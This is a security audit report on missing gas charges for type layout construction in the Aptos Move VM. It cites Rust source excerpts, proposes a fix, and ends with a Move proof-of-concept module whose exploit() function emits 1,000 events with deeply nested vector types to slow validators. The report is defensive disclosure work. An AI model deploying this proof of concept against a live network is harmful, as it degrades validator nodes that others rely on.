# Audit Report

## Title
Unmetered Type Layout Construction Enables Resource Exhaustion via Complex Vector Types

## Summary
The `type_to_type_layout_impl()` function in `ty_layout_converter.rs` does not charge gas for constructing type layouts of primitive and vector types. Attackers can exploit this by repeatedly calling native functions (e.g., `event::emit`, table operations) with deeply nested vector types (up to 128 levels deep), causing validators to perform expensive recursive computations without paying proportional gas costs.

## Finding Description

The type layout converter processes Move types recursively to construct serializable layouts. For primitive types and vectors, no gas is charged for this computational work: [1](#0-0) 

For vector types, the function recursively processes nested vectors without charging gas: [2](#0-1) 

Critically, vector types are **not cached**, while struct types are: [3](#0-2) 

The development team explicitly acknowledges this issue in a TODO comment: [4](#0-3) 

**Attack Path:**

1. Attacker creates a Move function that calls `0x1::event::emit<T>(value)` where `T` is a deeply nested vector type: `vector<vector<vector<...128 levels...<u8>>>>`
2. The event native function calls `type_to_type_layout_with_delayed_fields()`: [5](#0-4) 

3. Each call triggers full recursive layout construction (128 function calls) without caching
4. The attacker repeats this in a loop, paying only base event costs while validators perform expensive recursive computations

The only limits are depth/size constraints, not gas metering: [6](#0-5) 

Production configuration sets these limits to: [7](#0-6) 

## Impact Explanation

This vulnerability enables **resource exhaustion attacks** against validators and meets **High Severity** criteria per the Aptos bug bounty program ("Validator node slowdowns"):

1. **Disproportionate CPU consumption**: Processing a depth-128 vector type requires 128+ recursive function calls, pattern matches, and memory allocations, while the attacker pays only minimal event emission costs
2. **No caching for vectors**: Unlike struct types, vector layouts are recomputed on every call, enabling sustained abuse
3. **Repeatability**: Attacker can emit thousands of events per transaction, each triggering layout construction
4. **All validators affected**: Every validator node processes the same transactions and suffers the same CPU overhead
5. **Breaks Resource Limits invariant**: Violates the principle that "all operations must respect gas, storage, and computational limits"

While individual layout constructions are fast, an attacker emitting 1,000 events with depth-128 types causes 128,000+ unmetered recursive operations per transaction.

## Likelihood Explanation

**Likelihood: HIGH**

- **Attacker requirements**: Any user can submit transactions with complex type parameters
- **Complexity**: Trivial - call `event::emit<DeepVectorType>(value)` in a loop
- **Cost**: Minimal gas (only base event costs, not layout construction)
- **Detection**: Difficult to distinguish from legitimate complex type usage
- **Exploitability**: Immediate - no prerequisites or special permissions required

The TODO comment indicates this is a known issue awaiting proper gas charges implementation.

## Recommendation

Implement proportional gas charging for type layout construction operations. The gas cost should scale with the number of nodes processed (depth and complexity):

**Solution 1: Charge per layout node**
Add gas charging in `check_depth_and_increment_count()`:
```rust
fn check_depth_and_increment_count(
    &self,
    gas_meter: &mut impl NativeGasMeter, // Add gas meter parameter
    node_count: &mut u64,
    depth: u64,
) -> PartialVMResult<()> {
    // Charge gas per node processed
    gas_meter.charge_native_execution(LAYOUT_NODE_COST)?;
    
    let max_count = self.vm_config().layout_max_size;
    // ... existing limit checks ...
}
```

**Solution 2: Use existing type creation charging**
Leverage the `charge_create_ty` mechanism to charge for layout construction based on type complexity: [8](#0-7) 

The fix should ensure:
1. Gas charged is proportional to layout depth and node count
2. Caching remains effective (cache hits still charge the same gas as construction)
3. Simple types (primitives, shallow structs) remain cheap

## Proof of Concept

```move
module attacker::resource_exhaustion {
    use std::event;
    use std::vector;

    // Deeply nested vector type - depth approaching limit
    struct Event has copy, drop, store {
        data: vector<vector<vector<vector<vector<vector<vector<vector<vector<vector<
              vector<vector<vector<vector<vector<vector<vector<vector<vector<vector<
              vector<vector<vector<vector<vector<vector<vector<vector<vector<vector<
              vector<vector<u8>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    }

    // Attack function: emit many events with complex type layouts
    public entry fun exploit() {
        let i = 0;
        while (i < 1000) {
            // Each emit triggers full layout construction (30+ recursive calls)
            // Attacker pays only base event cost, not layout construction cost
            event::emit(Event { 
                data: vector::empty() 
            });
            i = i + 1;
        }
        // Result: 30,000+ unmetered recursive function calls
        // Validators consume significant CPU with minimal gas compensation
    }
}
```

**Expected behavior**: Transaction should charge gas proportional to layout construction work (1000 events Ã— 30 depth = 30,000 nodes processed).

**Actual behavior**: Only base event emission costs are charged; layout construction is unmetered.

## Notes

This vulnerability is explicitly acknowledged in the codebase via the TODO comment at line 367. The issue affects all native functions that require type layout construction (event emission, table operations, serialization). While bounded by depth/size limits (128/512), the lack of proportional gas charging enables sustained resource exhaustion attacks against validator nodes.

### Citations

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L88-106)
```rust
        let ty_pool = self.runtime_environment().ty_pool();
        if self.vm_config().enable_layout_caches {
            let key = match ty {
                Type::Struct { idx, .. } => {
                    let ty_args_id = ty_pool.intern_ty_args(&[]);
                    Some(StructKey {
                        idx: *idx,
                        ty_args_id,
                    })
                },
                Type::StructInstantiation { idx, ty_args, .. } => {
                    let ty_args_id = ty_pool.intern_ty_args(ty_args);
                    Some(StructKey {
                        idx: *idx,
                        ty_args_id,
                    })
                },
                _ => None,
            };
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L194-222)
```rust
    /// Since layout is a tree data structure, we limit its size and depth during construction.
    /// This function checks that the number of nodes in the layout and its depth are within limits
    /// enforced by the VM config. The count is incremented.
    fn check_depth_and_increment_count(
        &self,
        node_count: &mut u64,
        depth: u64,
    ) -> PartialVMResult<()> {
        let max_count = self.vm_config().layout_max_size;
        if *node_count > max_count || *node_count == max_count && self.is_lazy_loading_enabled() {
            return Err(
                PartialVMError::new(StatusCode::TOO_MANY_TYPE_NODES).with_message(format!(
                    "Number of type nodes when constructing type layout exceeded the maximum of {}",
                    max_count
                )),
            );
        }
        *node_count += 1;

        if depth > self.vm_config().layout_max_depth {
            return Err(
                PartialVMError::new(StatusCode::VM_MAX_VALUE_DEPTH_REACHED).with_message(format!(
                    "Depth of a layout exceeded the maximum of {} during construction",
                    self.vm_config().layout_max_depth
                )),
            );
        }
        Ok(())
    }
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L267-282)
```rust
            Type::Bool => (MoveTypeLayout::Bool, false),
            Type::U8 => (MoveTypeLayout::U8, false),
            Type::U16 => (MoveTypeLayout::U16, false),
            Type::U32 => (MoveTypeLayout::U32, false),
            Type::U64 => (MoveTypeLayout::U64, false),
            Type::U128 => (MoveTypeLayout::U128, false),
            Type::U256 => (MoveTypeLayout::U256, false),
            Type::I8 => (MoveTypeLayout::I8, false),
            Type::I16 => (MoveTypeLayout::I16, false),
            Type::I32 => (MoveTypeLayout::I32, false),
            Type::I64 => (MoveTypeLayout::I64, false),
            Type::I128 => (MoveTypeLayout::I128, false),
            Type::I256 => (MoveTypeLayout::I256, false),
            Type::Address => (MoveTypeLayout::Address, false),
            Type::Signer => (MoveTypeLayout::Signer, false),
            Type::Function { .. } => (MoveTypeLayout::Function, false),
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L283-296)
```rust
            Type::Vector(ty) => self
                .type_to_type_layout_impl::<ANNOTATED>(
                    gas_meter,
                    traversal_context,
                    modules,
                    ty,
                    count,
                    depth + 1,
                    check_option_type,
                )
                .map(|(elem_layout, contains_delayed_fields)| {
                    let vec_layout = MoveTypeLayout::Vector(Box::new(elem_layout));
                    (vec_layout, contains_delayed_fields)
                })?,
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L363-367)
```rust
    // TODO(lazy-loading):
    //   We do not add struct cyclic checks here because it can be rather expensive to check. In
    //   general, because we have depth / count checks and charges for modules this will eventually
    //   terminate in any case. In the future, layouts should be revisited anyway.
    //   Consider adding proper charges here for layout construction (before rollout).
```

**File:** aptos-move/framework/src/natives/event.rs (L296-298)
```rust
    let (layout, contains_delayed_fields) = context
        .type_to_type_layout_with_delayed_fields(ty)?
        .unpack();
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L215-245)
```rust
    let layout_max_size = if gas_feature_version >= RELEASE_V1_30 {
        512
    } else {
        256
    };

    // Value runtime depth checks have been introduced together with function values and are only
    // enabled when the function values are enabled. Previously, checks were performed over types
    // to bound the value depth (checking the size of a packed struct type bounds the value), but
    // this no longer applies once function values are enabled. With function values, types can be
    // shallow while the value can be deeply nested, thanks to captured arguments not visible in a
    // type. Hence, depth checks have been adjusted to operate on values.
    let enable_depth_checks = features.is_enabled(FeatureFlag::ENABLE_FUNCTION_VALUES);
    let enable_capture_option = !timed_features.is_enabled(TimedFeatureFlag::DisabledCaptureOption)
        || features.is_enabled(FeatureFlag::ENABLE_CAPTURE_OPTION);

    // Some feature gating was missed, so for native dynamic dispatch the feature is always on for
    // testnet after 1.38 release.
    let enable_function_caches = features.is_call_tree_and_instruction_vm_cache_enabled();
    let enable_function_caches_for_native_dynamic_dispatch =
        enable_function_caches || (chain_id.is_testnet() && gas_feature_version >= RELEASE_V1_38);

    let config = VMConfig {
        verifier_config,
        deserializer_config,
        paranoid_type_checks,
        legacy_check_invariant_in_swap_loc: false,
        // Note: if updating, make sure the constant is in-sync.
        max_value_nest_depth: Some(DEFAULT_MAX_VM_VALUE_NESTED_DEPTH),
        layout_max_size,
        layout_max_depth: 128,
```

**File:** third_party/move/move-vm/types/src/gas.rs (L389-389)
```rust
    fn charge_create_ty(&mut self, num_nodes: NumTypeNodes) -> PartialVMResult<()>;
```
